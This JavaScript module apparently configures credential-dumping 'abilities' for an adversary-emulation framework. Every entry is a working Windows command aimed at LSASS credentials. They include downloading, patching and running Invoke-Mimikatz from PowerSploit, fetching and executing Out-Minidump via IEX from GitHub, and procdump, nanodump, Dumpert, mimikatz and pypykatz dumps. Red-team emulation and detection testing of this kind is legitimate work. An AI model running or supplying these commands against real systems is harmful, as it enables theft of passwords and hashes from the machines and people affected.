const CUSTOM_ABILITY_OVERRIDES = {
  "7049e3ec-b822-4fdf-a4ac-18190f9b66d1": {
    win_prereq: [
      `$dest = "C:\\Windows\\System32\\invoke-mimi.ps1"`,
      `if (-not (Test-Path $dest) -or (Get-Item $dest -ErrorAction SilentlyContinue).Length -eq 0) {`,
      `  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12`,
      `  Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1" -OutFile $dest -UseBasicParsing`,
      `  $f = Get-Item $dest -ErrorAction Stop`,
      `  if ($f.Length -eq 0) { throw "invoke-mimi.ps1 downloaded but empty" }`,
      `  Write-Host "DEPLOYED $($f.Length) bytes"`,
      `} else {`,
      `  Write-Host "ALREADY_PRESENT: $dest"`,
      `}`,
      `$old = '$UnsafeNativeMethods.GetMethod(''GetProcAddress'')'`,
      `$new = '$UnsafeNativeMethods.GetMethod(''GetProcAddress'', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null)'`,
      `$content = Get-Content $dest -Raw`,
      `$patched = $content.Replace($old, $new)`,
      `Set-Content $dest $patched -Encoding UTF8`,
      `Write-Host "PATCHED $dest"`,
    ].join("; "),
    command: `iex (Get-Content .\\invoke-mimi.ps1 -Raw);\nInvoke-Mimikatz -DumpCreds *>&1 | Out-File C:\\Windows\\Temp\\mimi-out.txt -Encoding UTF8;\nGet-Content C:\\Windows\\Temp\\mimi-out.txt`,
  },
  "60bb6f8468aa98b75be2521861a164d5": {
    command: `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; try { IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1' -UseBasicParsing) } catch { $_ | Out-File C:\\Windows\\Temp\\minidump_err.txt -Append; exit 1 }; try { get-process lsass | Out-Minidump -DumpFilePath C:\\Windows\\Temp } catch { $_ | Out-File C:\\Windows\\Temp\\minidump_err.txt -Append }"`,
    executor: "cmd",
  },
  "3ae905fe6171f9d0fbefd9cb6b8d6a82": {
    command: `"C:\\Users\\Public\\procdump.exe" -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp`,
    executor: "cmd",
  },
  "54643bf2018c940ca5fc21097884d2d4": {
    command: `"C:\\Users\\Public\\procdump.exe" -accepteula -mm lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp`,
    executor: "cmd",
  },
  "505f7b839938e8cea8db2dc9a4448f57": {
    command: `"C:\\Users\\Public\\nanodump.x64.exe" --silent-process-exit "%temp%\\SilentProcessExit"`,
    executor: "cmd",
  },
  "990a4629d154622098b70ba50384051f": {
    command: `"C:\\Users\\Public\\nanodump.x64.exe" -w "%temp%\\nanodump.dmp"`,
    executor: "cmd",
  },
  "03455985e8bf5d2ee43947cadaca2256": {
    command: `"C:\\Users\\Public\\Outflank-Dumpert.exe"`,
    executor: "cmd",
  },
  "7e8ccbe3de961012b6464485829e87a4": {
    command: `"C:\\Users\\Public\\x64\\mimikatz.exe" "sekurlsa::minidump %tmp%\\lsass.DMP" "sekurlsa::logonpasswords full" exit`,
    executor: "cmd",
  },
  "7d1c6222726c67b13740450275dc2162": {
    command: `"C:\\Program Files\\Python310\\python.exe" -m pypykatz live lsa > C:\\Users\\Public\\pypykatz_out.txt 2>&1`,
    executor: "cmd",
  },
}

export default CUSTOM_ABILITY_OVERRIDES
